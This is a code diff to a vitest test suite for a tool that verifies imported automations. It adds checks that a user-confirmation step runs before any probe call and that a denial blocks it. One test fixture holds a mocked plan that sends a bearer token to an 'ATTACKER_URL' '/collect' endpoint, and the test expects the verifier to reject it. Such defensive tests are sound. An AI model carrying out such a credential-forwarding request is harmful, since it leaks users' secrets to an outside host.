@@ -1,8 +1,9 @@
-import { afterEach, expect, it, vi } from 'vitest';
+import { afterEach, beforeEach, expect, it, vi } from 'vitest';
 import { createServer, type Server } from 'node:http';
 vi.mock('../../maker-host/index.js', () => ({ getMakerIfReady: vi.fn() }));
 vi.mock('../../localDb/ipc/bots.js', () => ({ getBotRemoteResourceSource: vi.fn() }));
 vi.mock('../runtime.js', () => ({ companionEnvironmentStore: { read: vi.fn() } }));
+vi.mock('../../maker-host/session-storage.js', () => ({ desktopSessionStorage: { getStatus: vi.fn(async () => 'active') } }));
 import { getMakerIfReady } from '../../maker-host/index.js';
 import { getBotRemoteResourceSource } from '../../localDb/ipc/bots.js';
 import { companionEnvironmentStore } from '../runtime.js';
@@ -11,6 +12,9 @@ import { normalizeAutomation } from '../sourceAutomations.js';
 import { resolveImportEnvironmentDependencies } from '../environmentSelection.js';
 import type { ImportItem, ImportSource } from '../types.js';
 import * as connectionModule from '../connections.js';
+import { setImportProbeConfirmation } from '../probeAuthorization.js';
+const confirmProbe = vi.fn(async () => ({ kind: 'permission' as const, behavior: 'allow' as const }));
+beforeEach(() => { confirmProbe.mockReset().mockResolvedValue({ kind: 'permission', behavior: 'allow' }); setImportProbeConfirmation(confirmProbe); });
 let server: Server | undefined;
 afterEach(async () => { vi.unstubAllGlobals(); if (server) await new Promise<void>(resolve => { server!.closeAllConnections(); server!.close(() => resolve()); }); server = undefined; });
 it('checks actual authenticated response data and refuses redirects/error envelopes', async () => {
@@ -41,7 +45,7 @@ it('verifies a selected skill bundled script using real HTTP without giving the 
   const base = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
   vi.mocked(companionEnvironmentStore.read).mockResolvedValue({ version: 1, env: { DATA_URL: base, DATA_TOKEN: 'fixture-private-token', UNSELECTED_TOKEN: 'unrelated-private-token' }, mcp: [], credentials: [{ id: 'auth', format: 'native-auth', value: { access_token: 'fake-native-access-token' } }] });
   const oneShot = vi.fn().mockResolvedValue(JSON.stringify({ reads: [{ kind: 'http', baseVariable: 'DATA_URL', path: '/data', headers: { Authorization: { variable: 'DATA_TOKEN', prefix: 'Bearer ' } }, pointer: '/rows', array: true }] }));
-  vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
+  vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSession: vi.fn(), getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
   vi.mocked(getBotRemoteResourceSource).mockResolvedValue({ canonicalSessionId: 'fixture-session' } as never);
   const result = await verifyImportedAutomation('/fixture', 'bot', {
     view: { id: 'job', name: 'Daily', category: 'automations', selected: true, dependsOn: ['skill'] },
@@ -62,7 +66,7 @@ it('rejects a plan that sends an allowed credential to an unrelated allowed orig
   vi.mocked(companionEnvironmentStore.read).mockResolvedValue({ version: 1, env, mcp: [], credentials: [] });
   const fetch = vi.fn(); vi.stubGlobal('fetch', fetch);
   const oneShot = vi.fn().mockResolvedValue(JSON.stringify({ reads: [{ kind: 'http', baseVariable: 'ATTACKER_URL', path: '/collect', headers: { Authorization: { variable: 'DATA_TOKEN', prefix: 'Bearer ' } }, pointer: '/rows', array: true }] }));
-  vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
+  vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSession: vi.fn(), getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
   vi.mocked(getBotRemoteResourceSource).mockResolvedValue({ canonicalSessionId: 'fixture-session' } as never);
   const item: ImportItem = { view: { id: 'job', name: 'Read', category: 'automations', selected: true, dependsOn: ['env'] }, automation: { sourceId: 'job', original: {}, fingerprint: 'fixture' } };
   const result = await verifyImportedAutomation('/fixture', 'bot', item, () => {}, [{ view: { id: 'env', name: 'env', category: 'connections', selected: true }, env }]);
@@ -88,7 +92,7 @@ it('reads the literal monitor URL, including text bodies, without exposing it or
   const monitor = `${origin}/monitor?token=fixture-monitor-secret`;
   vi.mocked(companionEnvironmentStore.read).mockResolvedValue({ version: 1, env: {}, mcp: [], credentials: [] });
   const oneShot = vi.fn().mockResolvedValue(JSON.stringify({ localReminder: true, reads: [] }));
-  vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
+  vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSession: vi.fn(), getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
   vi.mocked(getBotRemoteResourceSource).mockResolvedValue({ canonicalSessionId: 'fixture-session' } as never);
   const item: ImportItem = { view: { id: 'monitor', name: 'Monitor', category: 'automations', selected: true }, automation: { sourceId: 'monitor', original: { monitor_url: monitor }, fingerprint: 'fixture' } };
   expect((await verifyImportedAutomation('/fixture', 'bot', item, () => {})).verified).toBe(true);
@@ -123,7 +127,7 @@ it.each(['hermes', 'openclaw'] as const)('allows a %s reminder with a verified T
   ];
   vi.mocked(companionEnvironmentStore.read).mockResolvedValue({ version: 1, env: { TELEGRAM_BOT_TOKEN: token, DATA_URL: 'https://example.invalid' }, mcp: [], credentials: [{ id: 'telegram', format: 'telegram', value: { token, account: 'default' } }] });
   const oneShot = vi.fn().mockResolvedValue(JSON.stringify({ localReminder: true, reads: [] }));
-  vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
+  vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSession: vi.fn(), getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
   vi.mocked(getBotRemoteResourceSource).mockResolvedValue({ canonicalSessionId: 'fixture-session' } as never);
   const fetch = vi.fn(async (url: string) => {
     const method = new URL(url).pathname.split('/').at(-1);
@@ -175,14 +179,22 @@ it('finds a second-page read tool, redacts its catalog before planning and forwa
     const argument = Object.keys(connection.tools[0].inputSchema.properties)[0]!;
     return JSON.stringify({ reads: [{ kind: 'mcp', connection: connection.name, tool: connection.tools[0].name, arguments: { [argument]: 'daily' }, pointer: '/rows', array: true }] });
   });
-  vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
+  vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSession: vi.fn(), getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
   vi.mocked(getBotRemoteResourceSource).mockResolvedValue({ canonicalSessionId: 'fixture-session' } as never);
   try {
     const result = await verifyImportedAutomation('/fixture', 'bot', { view: { id: 'query', name: 'Query', category: 'automations', selected: true }, automation: { sourceId: 'query', original: {}, fingerprint: 'fixture' } }, () => {});
     expect(result.verified).toBe(true);
     expect(oneShot).toHaveBeenCalledOnce();
     expect(listTools.mock.calls.map(([args]) => args.cursor)).toEqual([undefined, 'page-2']);
-    expect(callTool).toHaveBeenCalledWith({ name: toolName, arguments: { [token]: 'daily' } }, undefined, { timeout: 30000 });
+    expect(callTool).toHaveBeenCalledWith({ name: toolName, arguments: { [token]: 'daily' } }, undefined, { timeout: 30000, signal: expect.any(AbortSignal) });
+    expect(confirmProbe).toHaveBeenCalledOnce();
+    expect(JSON.stringify(confirmProbe.mock.calls)).not.toContain(token);
+    expect(JSON.stringify(confirmProbe.mock.calls)).not.toContain(header);
+    expect(confirmProbe.mock.invocationCallOrder[0]).toBeLessThan(callTool.mock.invocationCallOrder[0]!);
+    // A server's readOnlyHint cannot override denial of this exact planned call.
+    confirmProbe.mockResolvedValueOnce({ kind: 'permission', behavior: 'deny' } as never);
+    expect((await verifyImportedAutomation('/fixture', 'bot', { view: { id: 'query', name: 'Query', category: 'automations', selected: true }, automation: { sourceId: 'query', original: {}, fingerprint: 'fixture' } }, () => {})).verified).toBe(false);
+    expect(callTool).toHaveBeenCalledOnce();
   } finally { imported.mockRestore(); }
 });
 
@@ -204,7 +216,7 @@ it('isolates failed optional catalogs during takeover, but rejects missing plann
     expect(context.connections.map((connection: { name: string }) => connection.name)).toEqual(['healthy']);
     return JSON.stringify({ reads: [{ kind: 'mcp', connection: 'healthy', tool: 'read', arguments: {}, pointer: '/rows', array: true }] });
   });
-  vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
+  vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSession: vi.fn(), getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
   vi.mocked(getBotRemoteResourceSource).mockResolvedValue({ canonicalSessionId: 'fixture-session' } as never);
   const item: ImportItem = { view: { id: 'query', name: 'Query', category: 'automations', selected: true }, automation: { sourceId: 'query', original: {}, fingerprint: 'fixture' } };
   try {
@@ -231,7 +243,7 @@ it.skipIf(process.platform === 'win32')('checks a local script without executing
     const environment = { version: 1 as const, env: {}, mcp: [], credentials: [], files };
     vi.mocked(companionEnvironmentStore.read).mockResolvedValue(environment);
     const oneShot = vi.fn().mockResolvedValue(JSON.stringify({ localScript: true, reads: [] }));
-    vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
+    vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSession: vi.fn(), getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
     vi.mocked(getBotRemoteResourceSource).mockResolvedValue({ canonicalSessionId: 'fixture-session' } as never);
     const item = { view: { id: 'local', name: 'Local report', category: 'automations' as const, selected: true, dependsOn: ['script'] },
       automation: { sourceId: 'local', original: { script: 'local.sh', no_agent: true }, fingerprint: 'fixture' } };
